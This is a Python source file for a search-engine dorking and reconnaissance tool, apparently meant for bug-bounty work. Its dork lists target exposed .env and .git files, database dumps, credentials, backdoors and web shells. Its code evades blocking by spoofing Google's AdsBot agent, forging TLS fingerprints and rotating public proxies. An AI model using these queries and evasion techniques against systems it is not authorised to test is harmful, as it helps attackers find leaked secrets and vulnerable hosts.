import requests, random, os, base64, json, re, contextlib, argparse, sys, time
import threading, socket, signal, webbrowser, subprocess
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
from multiprocessing import Pool
from functools import partial
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, BaseHTTPRequestHandler

try:
    import readline
except ImportError:
    readline = None

try:
    from curl_cffi import requests as cffi_requests
    HAVE_CURL_CFFI = True
except ImportError:
    HAVE_CURL_CFFI = False

# ---------------------------------------------------------------------------
# Global state
# ---------------------------------------------------------------------------
engine = 'google'
pages = 1
processes = 2
consecutive_captcha_hits = 0
use_adsbot = False
use_cffi = False
use_proxy = False
proxy_pool = []
proxy_index = 0
searx_host = None
yacy_host = None
searx_engines = None
searx_categories = 'general'
notify_more_pages = True
ask_pages = None            # whether to prompt for 'more pages' (None = auto)
max_follow_pages = 20
log_handle = None           # Tee handle for -O output
webview = None
collected_rows = []         # every result collected during a run
show_meta = True            # whether to print title/snippet/engine detail
VALID_ENGINES = ['google', 'bing', 'duckduckgo', 'searxng', 'yacy']

##########
# COLORS #
##########
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
VERSION = "3.0"

###############
# USER AGENTS #
###############
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

ADSBOT_UA = "AdsBot-Google (+http://www.google.com/adsbot.html)"

GOOGLE_FRONTENDS = [
    "https://www.google.com/search",
    "https://www.google.co.in/search",
    "https://www.google.de/search",
    "https://www.google.co.uk/search",
    "https://www.google.com.br/search",
    "https://www.google.co.jp/search",
]

#################
# DEFAULT DORKS #
#################
# (legacy: file-type dorks)
FILETYPE_DORKS = [
    "filetype:doc", "filetype:docx", "filetype:xls", "filetype:xlsx", "filetype:ppt",
    "filetype:pptx", "filetype:mdb", "filetype:pdf", "filetype:txt", "filetype:rtf",
    "filetype:csv", "filetype:xml", "filetype:conf", "filetype:dat", "filetype:ini",
    "filetype:log", "filetype:py", "filetype:html", "filetype:sh", "filetype:odt",
    "filetype:key", "filetype:md", "filetype:old", "filetype:bin", "filetype:cer",
    "filetype:crt", "filetype:pfx", "filetype:crl", "filetype:der", "filetype:pages",
    "filetype:sql",
]
INURL_DORKS = [
    "inurl:admin", "inurl:login", "inurl:adminlogin", "inurl:cplogin",
    "inurl:weblogin", "inurl:quicklogin", "inurl:wp-admin", "inurl:wp-login",
    "inurl:portal", "inurl:userportal", "inurl:loginpanel", "inurl:memberlogin",
    "inurl:remote", "inurl:dashboard", "inurl:auth", "inurl:exchange",
    "inurl:ForgotPassword", "inurl:test", "inurl:.git", "inurl:backup",
]
INTITLE_DORKS = [
    'intitle:"index of" "parent directory"',
    'intitle:"index of" "DCIM"',
    'intitle:"index of" "ftp"',
    'intitle:"index of" "backup"',
    'intitle:"index of" "mail"',
    'intitle:"index of" "password"',
    'intitle:"index of" "pub"',
    'intitle:"index of" ".git"',
    'intitle:"index of" "log"',
    'intitle:"index of" "src"',
    'intitle:"index of" "env"',
    'intitle:"index of" ".env"',
    'intitle:"index of" ".sql"',
    'intitle:"index of" "api"',
    'intitle:"index of" "admin"',
]

# Alias kept for the original variable names when the module is imported.
INURL = INURL_DORKS
FILETYPE = FILETYPE_DORKS
INTITLE = INTITLE_DORKS
ALLDORKS = INURL + FILETYPE + INTITLE

# ---------------------------------------------------------------------------
# H4cksploit / bug-bounty-recon dork catalog (58 techniques)
# mode 'site' -> prefixed with site:<domain>
# mode 'global' -> self-contained query, {domain} substituted
# ---------------------------------------------------------------------------
H4_DORKS = [
    {"category": "Directory Listing",     "mode": "site",   "dork": "intitle:index.of"},
    {"category": "Configuration Files",   "mode": "site",   "dork": "ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini"},
    {"category": "Database Files",        "mode": "site",   "dork": "ext:sql | ext:dbf | ext:mdb"},
    {"category": "WordPress",             "mode": "site",   "dork": "inurl:wp- | inurl:wp-content | inurl:plugins | inurl:uploads | inurl:themes | inurl:download"},
    {"category": "Log Files",             "mode": "site",   "dork": "ext:log"},
    {"category": "Backup and Old Files",  "mode": "site",   "dork": "ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup"},
    {"category": "Login Pages",           "mode": "site",   "dork": "inurl:login | inurl:signin | intitle:Login | inurl:auth"},
    {"category": "SQL Errors",            "mode": "site",   "dork": 'intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: pg_connect()"'},
    {"category": "Exposed Documents",     "mode": "site",   "dork": "ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv"},
    {"category": "phpinfo()",             "mode": "site",   "dork": 'ext:php intitle:phpinfo "published by the PHP Group"'},
    {"category": "Backdoors",             "mode": "site",   "dork": "inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor"},
    {"category": "Install/Setup Files",   "mode": "site",   "dork": "inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config"},
    {"category": "Apache Struts RCE",     "mode": "site",   "dork": "ext:action | ext:struts | ext:do"},
    {"category": "API Endpoints (WSDL)",  "mode": "site",   "dork": "filetype:wsdl | filetype:WSDL | ext:svc | inurl:wsdl | inurl:asmx?wsdl | inurl:jws?wsdl | intitle:_vti_bin/sites.asmx?wsdl | inurl:_vti_bin/sites.asmx?wsdl"},
    {"category": "Apache Config Files",   "mode": "site",   "dork": 'filetype:config "apache"'},
    {"category": ".HTACCESS / phpinfo",   "mode": "site",   "dork": 'inurl:"/phpinfo.php" | inurl:".htaccess"'},
    {"category": "WordPress Exposure",    "mode": "site",   "dork": "inurl:wp-content | inurl:wp-includes"},
    {"category": "Open Redirects",        "mode": "site",   "dork": "inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http"},
    {"category": "Sub-subdomains",        "mode": "global", "dork": "site:*.*.{domain}"},
    {"category": "Subdomains",            "mode": "global", "dork": "site:*.{domain}"},
    {"category": "Robots.txt",            "mode": "global", "dork": '"{domain}/robots.txt"'},
    {"category": "Crossdomain.xml",       "mode": "global", "dork": '"{domain}/crossdomain.xml"'},
    {"category": "Pastebin Entries",      "mode": "global", "dork": "site:pastebin.com {domain}"},
    {"category": "Employees on LinkedIn", "mode": "global", "dork": "site:linkedin.com employees {domain}"},
    {"category": "GitLab",                "mode": "global", "dork": "inurl:gitlab {domain}"},
    {"category": "Traefik",               "mode": "global", "dork": 'intitle:traefik inurl:8080/dashboard "{domain}"'},
    {"category": "Stackoverflow",         "mode": "global", "dork": 'site:stackoverflow.com "{domain}"'},
    {"category": ".git Folder",           "mode": "global", "dork": 'inurl:"/.git {domain}" -github'},
    {"category": "3rd Party Exposure",    "mode": "global", "dork": 'site:ideone.com | site:codebeautify.org | site:codeshare.io | site:codepen.io | site:repl.it | site:justpaste.it | site:pastebin.com | site:jsfiddle.net | site:trello.com | site:*.atlassian.net | site:bitbucket.org "{domain}"'},
    {"category": "BitBucket & Atlassian", "mode": "global", "dork": 'site:atlassian.net | site:bitbucket.org "{domain}"'},
    {"category": "Throwbin",              "mode": "global", "dork": "site:throwbin.io {domain}"},
    {"category": "s3 Buckets",            "mode": "global", "dork": 'site:*.s3.amazonaws.com "{domain}"'},
    {"category": "Digitalocean Spaces",   "mode": "global", "dork": 'site:digitaloceanspaces.com "{domain}"'},
    {"category": ".SWF (Google)",         "mode": "global", "dork": "inurl:{domain} ext:swf"},
]

# Group B: external recon services. {domain} substituted at open/write time.
H4_EXTERNAL = [
    {"name": "DomainEye",            "url": "https://domaineye.com/similar/{domain}"},
    {"name": "Crt.sh",               "url": "https://crt.sh/?q={domain}"},
    {"name": "Wayback CDX (WP)",     "url": "http://web.archive.org/cdx/search?url={domain}/*&matchType=domain&collapse=digest&output=text&fl=original,timestamp&filter=urlkey:.*wp.*"},
    {"name": "Wayback CDX (SWF)",    "url": "http://web.archive.org/cdx/search?url={domain}/*&matchType=domain&collapse=urlkey&output=text&fl=original&filter=urlkey:.*swf&limit=100000"},
    {"name": "Wayback CDX (Flash)",  "url": "http://web.archive.org/cdx/search?url={domain}/*&matchType=domain&collapse=urlkey&output=text&fl=original&filter=mimetype:application/x-shockwave-flash&limit=100000"},
    {"name": "Wayback Machine",      "url": "https://web.archive.org/web/*/{domain}/*"},
    {"name": "OpenBugBounty",        "url": "https://www.openbugbounty.org/search/?search={domain}"},
    {"name": "Reddit",               "url": "https://www.reddit.com/search/?q={domain}"},
    {"name": "ThreatCrowd",          "url": "https://threatcrowd.org/domain.php?domain={domain}"},
    {"name": "PassiveTotal",         "url": "https://community.riskiq.com/search/{domain}"},
    {"name": "YouTube",              "url": "https://www.youtube.com/results?search_query={domain}"},
    {"name": "Yandex SWF",           "url": "https://yandex.com/search/?text=site:{domain}%20mime:swf"},
    {"name": "Reverse IP (ViewDNS)", "url": "https://viewdns.info/reverseip/?host={domain}&t=1"},
    {"name": "PublicWWW",            "url": "https://publicwww.com/websites/%22{domain}%22/"},
    {"name": "Censys IPv4",          "url": "https://search.censys.io/search?resource=hosts&q={domain}"},
    {"name": "Censys Certs",         "url": "https://search.censys.io/search?resource=certificates&q={domain}"},
    {"name": "Shodan",               "url": "https://www.shodan.io/search?query={domain}"},
    {"name": "SecurityHeaders",      "url": "https://securityheaders.com/?q={domain}&followRedirects=on"},
    {"name": "WhatCMS",              "url": "https://whatcms.org/?s={domain}"},
    {"name": "GitHub Code Search",   "url": "https://github.com/search?q=*.%22{domain}%22&type=code"},
    {"name": "Gist Search",          "url": "https://gist.github.com/search?q=*.%22{domain}%22"},
    {"name": "Cloud Storage CSE",    "url": "https://cse.google.com/cse?cx=002972716746423218710:veac6ui3rio#gsc.tab=0&gsc.q={domain}"},
]


def build_dork_defaults():
    out = []
    for cat, dorks in (("FILETYPE", FILETYPE), ("INURL", INURL_DORKS)):
        for d in dorks:
            out.append({"category": cat, "mode": "site", "dork": d})
    for d in INTITLE_DORKS:
        out.append({"category": "INTITLE", "mode": "site", "dork": d})
    return out

get_dork_defaults = build_dork_defaults


def get_h4_dorks():
    return [{"category": d["category"], "mode": d["mode"], "dork": d["dork"]} for d in H4_DORKS]


def get_all_dorks():
    seen, items = set(), []
    for d in build_dork_defaults() + get_h4_dorks():
        key = d["dork"]
        if key in seen:
            continue
        seen.add(key)
        items.append(d)
    return items


def resolve_dork_items(dork_set, dork_flag):
    """Return the list of dork dicts for the chosen set/file.
    dork_set: 'default'|'h4'|'all'  dork_flag: True, '-' (plain query) or a file path (-d)."""
    if dork_flag == '-':
        return None, 0
    if isinstance(dork_flag, str) and dork_flag:
        if os.path.exists(dork_flag):
            lines = SortFileCore(dork_flag)
            return [{"category": "custom", "mode": "site", "dork": l} for l in lines], len(lines)
        print(f"{YELLOW}[!] Dork file {dork_flag} does not exist{WHITE}")
        return [], 0
    if dork_flag is True:
        return build_dork_defaults(), len(build_dork_defaults())
    if dork_set is None:
        return None, 0
    ds = dork_set.lower()
    if ds in ('default', 'builtin'):
        items = build_dork_defaults()
    elif ds in ('h4', 'recon', 'h4cksploit'):
        items = get_h4_dorks()
    elif ds in ('all', 'full'):
        items = get_all_dorks()
    elif os.path.exists(ds):
        lines = SortFileCore(ds)
        return [{"category": "custom", "mode": "site", "dork": l} for l in lines], len(lines)
    else:
        print(f"{YELLOW}[!] Unknown dork set '{ds}' - using default{WHITE}")
        items = build_dork_defaults()
    return items, len(items)


def make_query(domain, item):
    """Build the final search query for a domain + dork item, mode aware."""
    dork = item["dork"] if isinstance(item, dict) else str(item)
    mode = item.get("mode", "site") if isinstance(item, dict) else "site"
    if mode == "global":
        return dork.replace("{domain}", domain).replace("{dom}", domain)
    if domain.lower().lstrip().startswith('site:'):
        return f"{domain} {dork}"
    return f"site:{domain} {dork}"


###################################
# BLOCK / CONSENT-WALL DETECTION  #
###################################
def detect_block_page(html_content, response_url, status_code=200):
    html_lower = html_content.lower()
    url_lower = response_url.lower()
    if 'google.com/sorry' in url_lower or 'recaptcha' in html_lower or 'unusual traffic' in html_lower:
        return 'captcha'
    if 'too many requests' in html_lower or 'rate limit' in html_lower or 'temporarily unavailable' in html_lower or \
       ('not a robot' in html_lower and 'recaptcha' in html_lower):
        return 'rate_limited'
    if status_code in (202, 429):
        return 'rate_limited'
    if 'consent.google.com' in url_lower or ('before you continue to google' in html_lower):
        return 'consent'
    if 'enablejs' in url_lower or 'enablejs' in html_lower or \
       ('please click' in html_lower and 'if you are not redirected' in html_lower):
        return 'js_required'
    if 'emsg=sg_rel' in url_lower or \
       ('your browser isn' in html_lower and 'supported anymore' in html_lower) or \
       ('update your browser' in html_lower):
        return 'rate_limited'
    if 'anomaly' in html_lower or ('detected a problem' in html_lower and 'duckduckgo' in html_lower):
        return 'rate_limited'
    return None


def get_captcha_retry_plan(use_adsbot=False, use_cffi=False, have_cffi=False):
    if use_adsbot and not use_cffi:
        return [{"name": "adsbot"}]
    if use_cffi and not use_adsbot:
        return [
            {"name": "adsbot", "use_adsbot": True, "use_cffi": False},
            {"name": "cffi", "use_adsbot": False, "use_cffi": True},
        ]
    if not use_adsbot and not use_cffi:
        plan = [{"name": "adsbot", "use_adsbot": True, "use_cffi": False}]
        if have_cffi:
            plan.append({"name": "cffi", "use_adsbot": False, "use_cffi": True})
        return plan
    return [{"name": "default", "use_adsbot": use_adsbot, "use_cffi": use_cffi}]

##################################
# FREE MANUAL CAPTCHA RESOLUTION #
##################################
def open_url_in_browser(url):
    try:
        if 'TERMUX_VERSION' in os.environ:
            subprocess.Popen(['termux-open-url', url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            webbrowser.open(url)
        return True
    except Exception:
        return False


def manual_captcha_flow(url, engine_name):
    global consecutive_captcha_hits
    consecutive_captcha_hits += 1
    print(f"\n{RED}[!]{WHITE} {CYAN}{engine_name}{WHITE} served a challenge page.")
    print(f"{YELLOW}[*] Free manual resolver: opening the challenge in your browser.{WHITE}")
    print(f"{CYAN}[*] URL: {WHITE}{url}")
    opened = open_url_in_browser(url)
    if not opened:
        print(f"{YELLOW}[*] Open the URL above manually in any browser.{WHITE}\n")
    try:
        choice = input(f"{CYAN}After solving press Enter to retry, or "
                       f"{WHITE}[s]{CYAN}kip{WHITE} -> ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        choice = 's'
    if choice.startswith('s'):
        return False
    time.sleep(random.uniform(4, 8))
    return True


########################################
# PROXY LOADER / CACHE / ROTATION      #
########################################
def load_gh_file(repo_owner, repo_name, file_path, access_token=None):
    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}"
    headers = {"Authorization": f"Bearer {access_token}"} if access_token else {}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            info = r.json()
            if 'content' in info:
                return base64.b64decode(info['content']).decode('utf-8')
            return ""
        return ""
    except Exception as e:
        print(f"{RED}[!] Error loading file: {e}{WHITE}")
        return None


def save_cache(content, last_dt, path):
    with open(path, "w") as f:
        json.dump({"content": content, "last_checked_time": last_dt.isoformat()}, f)


def load_cache(path):
    try:
        with open(path, "r") as f:
            d = json.load(f)
            return d["content"], datetime.fromisoformat(d["last_checked_time"])
    except (FileNotFoundError, KeyError, ValueError):
        return None, None


def UPND_PROXIES():
    repo_owner, repo_name, file_path = "TheSpeedX", "PROXY-List", "http.txt"
    cache_file = "cache.json"
    cached, last = load_cache(cache_file)
    if last and datetime.now() - last < timedelta(days=0.5):
        content = cached
        print(f"{GREEN}[+] Using cached proxy list (0.5d freshness).{WHITE}")
    else:
        print(f"{GREEN}[+] Fetching fresh proxy list...{WHITE}")
        content = load_gh_file(repo_owner, repo_name, file_path, None)
        if content and cached != content:
            if os.path.exists(cache_file):
                os.remove(cache_file)
            save_cache(content, datetime.now(), cache_file)
    proxy = []
    if content:
        for line in content.split('\n'):
            p = line.strip()
            if p:
                proxy.append(p)
    return proxy


def load_proxy_file_(path):
    proxies = []
    try:
        with open(path, 'r') as f:
            for line in f:
                p = line.strip()
                if p:
                    proxies.append(p)
    except Exception as e:
        print(f"{RED}[!] Error reading proxies file: {e}{WHITE}")
    return proxies


def get_proxy_dict():
    global proxy_pool, proxy_index, use_proxy
    if not use_proxy or not proxy_pool:
        return None
    if proxy_index >= len(proxy_pool):
        proxy_index = 0
    proxy = proxy_pool[proxy_index]
    proxy_index = (proxy_index + 1) % len(proxy_pool)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}


def rotate_proxy():
    global proxy_index
    proxy_index += 1
    return get_proxy_dict()


def test_proxy(ip, domain):
    pd = {"http": f"http://{ip}", "https": f"http://{ip}"}
    with contextlib.suppress(requests.RequestException):
        r = requests.get(f"http://{domain}", proxies=pd, timeout=5, verify=True)
        if 200 <= r.status_code < 300:
            return True
    return False

################
# FILE UTILS   #
################
def SortFileCore(path):
    try:
        with open(path, 'r') as f:
            lines = f.readlines()
        return [l.strip() for l in lines if l.strip()]
    except Exception as e:
        print(f"{RED}[!] Error reading file: {e}{WHITE}")
        return []


def completer(text, state):
    options = [name for name in os.listdir('.') if name.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None


def canonical_url(url):
    if not url:
        return url
    return url.rstrip('/').split('#')[0]


def dedup_results(results):
    seen, out = set(), []
    for item in results:
        u = item.get('url') if isinstance(item, dict) else (item or '')
        k = canonical_url(u)
        if k in seen:
            continue
        seen.add(k)
        out.append(item)
    return out

########################################
# SESSION BUILDERS (with proxy hook)    #
########################################
def _build_session(adsbot_mode=False):
    session = requests.Session()
    ua = ADSBOT_UA if adsbot_mode else random.choice(USER_AGENTS)
    session.headers.update({
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    })
    session.cookies.set('CONSENT', 'YES+cb.20240101-00-p0.en+FX+410', domain='.google.com')
    return session


def _build_cffi_session(adsbot_mode=False):
    if not HAVE_CURL_CFFI:
        raise RuntimeError("curl_cffi not installed. pip install curl_cffi")
    session = cffi_requests.Session(impersonate="chrome120")
    ua = ADSBOT_UA if adsbot_mode else random.choice(USER_AGENTS)
    session.headers.update({
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    })
    session.cookies.set('CONSENT', 'YES+cb.20240101-00-p0.en+FX+410', domain='.')
    return session


def _build_session_for_mode(adsbot=False, cffi=False):
    return _build_cffi_session(adsbot) if cffi else _build_session(adsbot)


def resolve_fallback_engine(current_engine, fallback_engine='duckduckgo'):
    if current_engine in ('google', 'bing'):
        return fallback_engine
    return current_engine


def google_frontend():
    return random.choice(GOOGLE_FRONTENDS)

############################################################
# QUERYSEARCH: GOOGLE / BING with never-block ladder       #
############################################################
def _do_request(session, url, params, timeout=12):
    pd = get_proxy_dict() if use_proxy else None
    return session.get(url, params=params, timeout=timeout, proxies=pd,
                       headers={'Cache-Control': 'no-cache', 'Pragma': 'no-cache'})


def querysearch_google_bing(query, engine_name, debug, page_num):
    global consecutive_captcha_hits
    try:
        # ---- Bing: RSS endpoint is the least bot-fought surface.
        if engine_name == 'bing':
            try:
                time.sleep(random.uniform(0.5, 1.5))
                pd = get_proxy_dict() if use_proxy else None
                resp = requests.get('https://www.bing.com/search',
                                    params={'q': query, 'count': 10, 'format': 'rss'},
                                    timeout=12, proxies=pd,
                                    headers={'User-Agent': random.choice(USER_AGENTS)})
                resp.raise_for_status()
                import xml.etree.ElementTree as ET
                result = []
                root = ET.fromstring(resp.text)
                for item in root.iter('item'):
                    lnk = item.find('link')
                    if lnk is None or not lnk.text:
                        continue
                    t = item.find('title')
                    desc = item.find('description')
                    result.append({
                        'url': lnk.text.strip(),
                        'title': (t.text or '').strip() if t is not None else '',
                        'content': (desc.text or '').strip()[:300] if desc is not None else '',
                        'engine': 'bing',
                    })
                if result:
                    if debug:
                        print(f"{MAGENTA}[debug] bing RSS -> {len(result)} results{WHITE}")
                    return result
            except Exception as e:
                if debug:
                    print(f"{YELLOW}[debug] bing RSS failed: {e}{WHITE}")

        strategies = get_captcha_retry_plan(use_adsbot, use_cffi, HAVE_CURL_CFFI)
        if use_adsbot and not use_cffi:
            strategies = [{"name": "adsbot"}]
        last_block = None
        for attempt_idx, strategy in enumerate(strategies):
            if attempt_idx > 0:
                time.sleep(3 + attempt_idx)
            adsbot = strategy.get("use_adsbot", use_adsbot)
            cffi = strategy.get("use_cffi", use_cffi)

            params = {'q': query}
            if engine_name == 'google':
                params.update({'gbv': '1', 'hl': 'en', 'gl': 'us', 'filter': '0',
                               'num': '10', 'start': str(page_num * 10)})
                url = google_frontend()
            else:
                params.update({'first': page_num * 10, 'count': '10'})
                url = 'https://www.bing.com/search'

            try:
                session = _build_session_for_mode(adsbot, cffi)
                if debug:
                    print(f"{MAGENTA}[debug] attempt {attempt_idx+1} ({strategy['name']}) -> {url}{WHITE}")
                time.sleep(random.uniform(1.0, 2.0) + attempt_idx * 0.4)
                resp = _do_request(session, url, params, 12)
                resp.raise_for_status()
            except requests.exceptions.Timeout:
                last_block = 'timeout'; continue
            except requests.exceptions.ConnectionError:
                last_block = 'connection_error'; continue
            except requests.exceptions.HTTPError as e:
                last_block = 'rate_limited' if getattr(e.response, 'status_code', None) == 429 else 'request_error'
                continue
            except Exception:
                last_block = 'request_error'; continue

            block = detect_block_page(resp.text, str(resp.url), getattr(resp, 'status_code', 200))
            if block:
                last_block = block

                # If it's a captcha we can't automate: free manual resolver.
                if block == 'captcha' and consecutive_captcha_hits < 3:
                    if manual_captcha_flow(str(resp.url), engine_name):
                        continue          # user solved it -> retry chain
                    return {'_blocked': block}
                if block == 'rate_limited':
                    if use_proxy:
                        rotate_proxy()
                    time.sleep(random.uniform(3, 6) + attempt_idx)
                    continue
                continue

            soup = BeautifulSoup(resp.text, 'html.parser')
            result = []
            if engine_name == 'google':
                for h3 in soup.find_all('h3'):
                    a = h3.find_parent('a') or (h3.parent.find('a') if h3.parent else None)
                    href = a.get('href') if a else ''
                    # basic-HTML (gbv=1) wraps results as /url?q=<real-url>&sa=U&ved=...
                    if href.startswith('/url?q='):
                        from urllib.parse import urlparse, parse_qs, unquote
                        q = parse_qs(urlparse(href).query).get('q')
                        href = unquote(q[0]) if q else ''
                    if a and href.startswith('http'):
                        result.append({'url': href,
                                       'title': h3.get_text(strip=True),
                                       'content': '',
                                       'engine': 'google'})
                if not result:
                    for div in soup.find_all("div", {"class": "yuRUbf"}):
                        href = div.find('a')
                        if href and href.get('href'):
                            u = href.get('href')
                            if u.startswith('/url?q='):
                                from urllib.parse import urlparse, parse_qs, unquote
                                q = parse_qs(urlparse(u).query).get('q')
                                u = unquote(q[0]) if q else u
                            result.append({'url': u,
                                           'title': href.get_text(strip=True),
                                           'content': '',
                                           'engine': 'google'})
            else:  # bing html
                for cite in soup.find_all('cite'):
                    if cite.text:
                        result.append({'url': cite.text.strip(),
                                       'title': '',
                                       'content': '',
                                       'engine': 'bing'})
            if debug and not result:
                print(f"{MAGENTA}[debug] parsed 0 results; html dumped below{WHITE}\n{resp.text[:500]}")
            return result

        if last_block:
            return {'_blocked': last_block}
        return []
    except Exception as e:
        print(f"{RED}[!] Error in search page {page_num}: {e}{WHITE}")
        return []


def querysearch_searxng(query, debug, page_num, searx_host=None):
    try:
        session = requests.Session()
        session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        params = {
            'q': query, 'format': 'json', 'categories': searx_categories or 'general',
            'language': 'auto', 'time_range': '', 'safesearch': 0, 'pageno': page_num + 1,
        }
        if searx_engines:
            params['engines'] = searx_engines
        pd = get_proxy_dict() if use_proxy else None
        resp = session.get(f"{searx_host.rstrip('/')}/search", params=params, timeout=15, proxies=pd)
        resp.raise_for_status()
        data = resp.json()
        raw = data.get('results', [])
        result = []
        for r in raw:
            if not r.get('url'):
                continue
            result.append({
                'title': r.get('title', ''),
                'url': r['url'],
                'content': r.get('content', ''),
                'engine': r.get('engine') or r.get('engines') or '',
                'publishedDate': r.get('publishedDate', ''),
                'score': r.get('score', ''),
            })
        if debug and not result:
            print(f"{MAGENTA}[debug] searxng 0 results ({data.get('number_of_results')}){WHITE}")
        return result
    except requests.exceptions.HTTPError as e:
        if debug:
            print(f"{YELLOW}403 on SearXNG - json format disabled?{WHITE}")
        print(f"{RED}[!] Error in SearXNG page {page_num}: {e}{WHITE}")
        return []
    except Exception as e:
        print(f"{RED}[!] Error in SearXNG page {page_num}: {e}{WHITE}")
        return []


def querysearch_yacy(query, debug, page_num, yacy_host=None):
    try:
        session = requests.Session()
        session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        params = {'query': query, 'resource': 'global',
                  'startRecord': page_num * 10, 'maximumRecords': 10}
        pd = get_proxy_dict() if use_proxy else None
        resp = session.get(f"{yacy_host.rstrip('/')}/yacysearch.json", params=params, timeout=15, proxies=pd)
        resp.raise_for_status()
        data = resp.json()
        result = []
        for channel in data.get('channels', []):
            for item in channel.get('items', []):
                if not item.get('link'):
                    continue
                result.append({
                    'title': item.get('title', ''),
                    'url': item['link'],
                    'content': item.get('description', ''),
                    'engine': 'yacy',
                    'publishedDate': item.get('pubDate', ''),
                    'score': '',
                })
        if debug and not result:
            print(f"{MAGENTA}[debug] yacy 0 results{WHITE}")
        return result
    except Exception as e:
        print(f"{RED}[!] Error in YaCy page {page_num}: {e}{WHITE}")
        return []


def _ddg_vqd(session):
    """Fetch a vqd token from DuckDuckGo (helps pass the 202 anomaly wall)."""
    try:
        r = session.get('https://duckduckgo.com/', timeout=10)
        m = re.search(r"vqd=['\"]?([\d\-a-zA-Z]+)", r.text or '')
        return m.group(1) if m else None
    except Exception:
        return None


def querysearch_duckduckgo(query, debug, page_num):
    try:
        session = _build_session()
        session.headers['Referer'] = 'https://duckduckgo.com/'
        pd = get_proxy_dict() if use_proxy else None
        time.sleep(random.uniform(0.5, 1.5))
        vqd = _ddg_vqd(session)
        params = {'q': query, 's': page_num * 30}
        if vqd:
            params['vqd'] = vqd
        resp = session.get('https://html.duckduckgo.com/html/', params=params, timeout=10, proxies=pd)
        if resp.status_code == 202:
            return {'_blocked': 'rate_limited'}
        resp.raise_for_status()
        soup = BeautifulSoup(resp.text, 'html.parser')
        result = []
        seen = set()
        for a in soup.find_all('a', {'class': 'result__a'}):
            href = a.get('href')
            if not href:
                continue
            u = href
            if u.startswith('/'):
                # relative /l/?uddg=<urlencoded>&rut=... form
                from urllib.parse import urlparse, parse_qs, unquote
                q = parse_qs(urlparse(u).query).get('uddg')
                u = unquote(q[0]) if q else u
            if u in seen:
                continue
            seen.add(u)
            result.append({'url': u,
                           'title': a.get_text(strip=True),
                           'content': '',
                           'engine': 'duckduckgo'})
        if not result:
            # old lite markup fallback
            for a in soup.find_all('a', {'class': 'result-link'}):
                href = a.get('href')
                if href:
                    result.append({'url': href,
                                   'title': a.get_text(strip=True),
                                   'content': '',
                                   'engine': 'duckduckgo'})
        if debug and not result:
            print(f"{MAGENTA}[debug] ddg 0 results\n{resp.text[:500]}{WHITE}")
        return result
    except Exception as e:
        print(f"{RED}[!] Error in DuckDuckGo page {page_num}: {e}{WHITE}")
        return []


def _make_target(query, debug):
    global engine, searx_host, yacy_host
    if engine == 'duckduckgo':
        return partial(querysearch_duckduckgo, query, debug)
    elif engine == 'searxng':
        return partial(querysearch_searxng, query, debug, searx_host=searx_host)
    elif engine == 'yacy':
        return partial(querysearch_yacy, query, debug, yacy_host=yacy_host)
    else:
        return partial(querysearch_google_bing, query, engine, debug)


def run_search_fallback(query, debug, page_num=0):
    """engine aware wrapper with multi-tier fallback:
    primary engine -> (google/bing: duckduckgo) -> (searxng if configured)."""
    global engine

    def _try_ddg():
        return querysearch_duckduckgo(query, debug, page_num)

    def _try_searx():
        if searx_host:
            r = querysearch_searxng(query, debug, page_num, searx_host=searx_host)
            return r if not (isinstance(r, dict) and r.get('_blocked')) else []
        return None

    def _try_blocked(r):
        return isinstance(r, dict) and r.get('_blocked')

    if engine == 'duckduckgo':
        result = _try_ddg()
        if _try_blocked(result):
            print(f"{YELLOW}[*] DDG blocked; trying SearXNG fallback (if configured).{WHITE}")
            fb = _try_searx()
            return fb if fb is not None else result
        return result
    if engine == 'searxng':
        return querysearch_searxng(query, debug, page_num, searx_host=searx_host)
    if engine == 'yacy':
        return querysearch_yacy(query, debug, page_num, yacy_host=yacy_host)

    result = querysearch_google_bing(query, engine, debug, page_num)
    if _try_blocked(result):
        fb = resolve_fallback_engine(engine)
        print(f"{YELLOW}[*] {engine.upper()} blocked ({result['_blocked']}); falling back to {fb}.{WHITE}")
        if fb == 'duckduckgo':
            r2 = _try_ddg()
            if _try_blocked(r2):
